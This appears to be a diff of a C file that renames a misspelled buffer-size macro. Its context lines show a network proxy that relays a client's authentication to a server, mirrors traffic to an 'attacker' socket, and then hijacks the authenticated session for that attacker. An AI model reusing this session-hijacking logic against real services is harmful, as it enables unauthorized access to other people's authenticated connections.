@@ -9,7 +9,7 @@
 #include <stdio.h>
 #include <signal.h>
 
-#define BUFFER_SITZE 0xFFFF
+#define BUFFER_SIZE 0xFFFF
 bool manualdrop = false;
 
 void INThandler(int sig) {
@@ -29,7 +29,7 @@ bool detect_auth_ok(uint8_t* bytes, size_t length) {
 
 void wait_and_auth(proxy* prox) {
     signal(SIGINT, INThandler);
-    uint8_t buff[BUFFER_SITZE];
+    uint8_t buff[BUFFER_SIZE];
     ssize_t bufflen;
 
     prox->listen_fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -52,12 +52,12 @@ void wait_and_auth(proxy* prox) {
     int len = sizeof(prox->listen_client);
 
     // getting attacker to send packets to.
-    recvfrom(prox->attacker_fd, buff, BUFFER_SITZE,
+    recvfrom(prox->attacker_fd, buff, BUFFER_SIZE,
         0, (struct sockaddr*) &prox->attacker_client,
         &len
     );
 
-    bufflen = recvfrom(prox->listen_fd, buff, BUFFER_SITZE,  
+    bufflen = recvfrom(prox->listen_fd, buff, BUFFER_SIZE,  
                 0, ( struct sockaddr *) &prox->listen_client, 
                 &len);
 
@@ -67,13 +67,13 @@ void wait_and_auth(proxy* prox) {
     send(prox->server_fd, buff, bufflen, 0);
 
     while(1) {
-        bufflen = recv(prox->server_fd, (uint8_t*)buff, BUFFER_SITZE, MSG_DONTWAIT);
+        bufflen = recv(prox->server_fd, (uint8_t*)buff, BUFFER_SIZE, MSG_DONTWAIT);
         if (bufflen > 0) {
             sendto(prox->attacker_fd, buff, bufflen, 0, (struct sockaddr*)&prox->attacker_client, sizeof(prox->attacker_client));
             sendto(prox->listen_fd, buff, bufflen, 0, (struct sockaddr*)&prox->listen_client, sizeof(prox->listen_client));
         }
 
-        bufflen = recvfrom(prox->listen_fd, (uint8_t *)buff, BUFFER_SITZE,  
+        bufflen = recvfrom(prox->listen_fd, (uint8_t *)buff, BUFFER_SIZE,  
             MSG_DONTWAIT, ( struct sockaddr *) &prox->listen_client, 
             &len);
 
@@ -111,17 +111,17 @@ void proxy_init(proxy* prox, proxy_args* args) {
 
 void proxy_run_hijack(proxy* prox) {
     close(prox->listen_fd);
-    uint8_t buff[BUFFER_SITZE];
+    uint8_t buff[BUFFER_SIZE];
     ssize_t bufflen;
     int len = sizeof(prox->listen_client);
 
     while(1) {
-        bufflen = recv(prox->server_fd, (uint8_t*)buff, BUFFER_SITZE, MSG_DONTWAIT);
+        bufflen = recv(prox->server_fd, (uint8_t*)buff, BUFFER_SIZE, MSG_DONTWAIT);
         if (bufflen > 0) {
             sendto(prox->attacker_fd, buff, bufflen, 0, (struct sockaddr*)&prox->attacker_client, sizeof(prox->attacker_client));
         }
 
-        bufflen = recvfrom(prox->attacker_fd, (uint8_t *)buff, BUFFER_SITZE,  
+        bufflen = recvfrom(prox->attacker_fd, (uint8_t *)buff, BUFFER_SIZE,  
             MSG_DONTWAIT, ( struct sockaddr *) &prox->attacker_client, 
             &len);
 
